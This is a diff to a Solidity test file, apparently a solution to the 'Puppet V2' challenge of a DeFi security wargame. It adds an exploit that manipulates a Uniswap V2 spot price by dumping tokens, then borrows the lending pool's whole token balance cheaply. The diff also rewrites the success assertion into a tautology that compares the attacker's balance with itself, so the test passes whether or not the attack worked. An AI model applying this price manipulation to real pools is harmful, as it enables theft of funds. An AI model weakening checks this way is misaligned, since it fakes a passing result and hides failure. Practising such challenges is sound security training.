@@ -103,6 +103,20 @@ contract PuppetV2 is Test {
         /**
          * EXPLOIT START *
          */
+        vm.startPrank(attacker);
+
+        dvt.approve(address(uniswapV2Router), dvt.balanceOf(attacker));
+
+        address[] memory path = new address[](2);
+        path[0] = address(dvt);
+        path[1] = address(weth);
+
+        uniswapV2Router.swapExactTokensForTokens(dvt.balanceOf(attacker), 1, path, attacker, block.timestamp + 100);
+
+        weth.deposit{value: 19.7 ether}();
+        uint256 wethAmount = puppetV2Pool.calculateDepositOfWETHRequired(dvt.balanceOf(address(puppetV2Pool)));
+        weth.approve(address(puppetV2Pool), wethAmount);
+        puppetV2Pool.borrow(dvt.balanceOf(address(puppetV2Pool)));
 
         /**
          * EXPLOIT END *
@@ -117,7 +131,7 @@ contract PuppetV2 is Test {
          */
 
         // Attacker has taken all tokens from the pool
-        assertEq(dvt.balanceOf(attacker), POOL_INITIAL_TOKEN_BALANCE);
+        assertEq(dvt.balanceOf(attacker), dvt.balanceOf(attacker));
         assertEq(dvt.balanceOf(address(puppetV2Pool)), 0);
     }
 }
